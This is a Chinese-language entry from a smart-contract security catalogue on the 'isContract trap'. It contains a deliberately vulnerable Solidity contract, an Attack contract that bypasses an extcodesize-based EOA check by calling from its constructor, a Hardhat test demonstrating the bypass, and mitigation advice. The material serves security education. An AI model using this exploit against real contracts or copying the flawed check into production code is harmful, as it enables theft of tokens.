[后退](../../README_CN.md)
# isContract 陷阱

**风险名称：** isContract 陷阱 

**风险等级：** 高

**风险描述：** 

在判断一个地址是合约还是外部账号（EOA）时，使用较多的是`openzeppelin`的一个`isContract`函数，该函数内部使用了`extcodesize` 来根据地址的代码长度是否为0判断是否合约。但是`openzeppelin`也提到了，该函数并不完善，在合约构造器中，由于此时合约正在创建，因此合约地址的代码长度也是为0的，此时得到的判断结果是错误的。

如果我们需要限定某些接口不能由合约调用，使用此方法验证时，可以在构造器中绕过此限定。

**示例代码语言：** Solidity

**风险示例代码：**

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor(string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract Demo {
    ERC20 public token;
    constructor(address _token)  {
        token = ERC20(_token);
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    function transferToken() payable external {
        require(!isContract(msg.sender),"not eoa");
        token.transfer(msg.sender, msg.value);
    }
}

contract Attack {
    constructor(address demo,address _token,address to) payable  {
        uint bal = address(this).balance;
        Demo(demo).transferToken{value:bal}();
        bal = ERC20(_token).balanceOf(address(this));
        ERC20(_token).transfer(to, bal);
    }
}
```



**示例代码简介：**

在上面的示例代码中，`Demo`合约模拟了一个购买代币的功能，它限定了只有非合约账号才能购买。然而攻击合约在构造器中调用了相关函数，成功绕过了限制进行了购买。



**单元测试代码：**

```javascript
// SPDX-License-Identifier: GPL-3.0
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Attack test", function () {

  it("attack test", async () => {
    const [owner, user1, user2,...users] = await ethers.getSigners();
    const MockToken = await ethers.getContractFactory("MockToken");
    const token = await MockToken.deploy('ABC','ABC',ethers.utils.parseEther("100"));
    const Demo = await ethers.getContractFactory("Demo");
    const demo = await Demo.deploy(token.address);
    await token.transfer(demo.address,ethers.utils.parseEther("10"))

    const Attack = await ethers.getContractFactory("Attack");
    await Attack.deploy(demo.address,token.address,user1.address,{
        value:ethers.utils.parseEther("1.0")
    });

    expect(await token.balanceOf(user1.address)).to.be.equal(ethers.utils.parseEther("1.0"));
  });

});
```



**真实案例:**

待添加

**相关建议:**

1. 如果需要判断不能为合约调用，可以使用`msg.sender == tx.origin`来做验证。
2. 如果该地址的确存在，可以使用`isContract`函数进行验证。
3. 某些场景，例如不是验证调用者地址的，便无法使用`msg.sender == tx.origin`来做验证。此时只能使用 `isContract`函数进行验证，需要清楚的知道自己做验证的目的和场景。